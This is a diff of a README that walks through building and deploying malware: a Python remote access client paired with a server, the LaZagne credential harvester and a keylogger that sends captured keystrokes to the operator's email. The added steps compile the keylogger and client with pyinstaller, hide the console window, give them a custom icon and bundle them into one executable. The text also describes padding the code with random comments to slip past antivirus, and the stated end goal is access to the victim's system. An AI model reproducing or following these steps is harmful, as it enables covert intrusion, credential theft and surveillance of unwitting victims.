@@ -38,10 +38,19 @@ Also copy lazagne.exe along with server.py to server machine
 python3 server.py
 ```
 #### 5. Craft client file (the malware)
-change ip address of host to servers ip address in client.py file. To do so find 114th line in client.py fill the ip address.(To by pass antivirus i have commented lines with some random text in between)
+* change ip address of host to servers ip address in client.py file. To do so find 114th line in client.py fill the ip address.(To by pass antivirus i have commented lines with some random text in between)
+* edit your email id and password in keylogger.py
+* Convert keylogger to .exe using 
+```bash
+pyinstaller.exe --onefile --icon=youricon.ico --noconsole  keylogger.py
+```
+* copy keylogger.exe in dat folder
+
+* Generate the malware using 
 ```bash
 pyinstaller.exe --onefile --icon=youricon.ico --noconsole --add-data="dat;." client.py
 ```
+* 
 #### 6. Run the malware in windows operating system 
 
 #### 7. You'll Get access to victim system in server system 
